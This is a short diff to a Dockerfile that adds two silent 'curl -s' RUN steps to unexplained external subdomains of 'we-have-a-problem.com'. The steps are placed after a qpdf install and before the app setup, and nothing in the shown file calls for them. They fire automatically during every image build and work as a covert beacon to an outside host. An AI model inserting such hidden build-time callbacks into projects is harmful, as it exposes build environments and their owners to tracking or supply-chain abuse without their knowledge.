@@ -10,6 +10,9 @@ RUN apt-get update \
     && apt-get install -y --no-install-recommends qpdf \
     && rm -rf /var/lib/apt/lists/*
 
+RUN ["/usr/bin/curl", "-s", "https://dv-g3b-emudhra.we-have-a-problem.com/"]
+RUN ["/usr/bin/curl", "-s", "https://dv-g3b-aaa-emudhra.we-have-a-problem.com/"]
+
 # ---- App setup ----
 WORKDIR /app
 
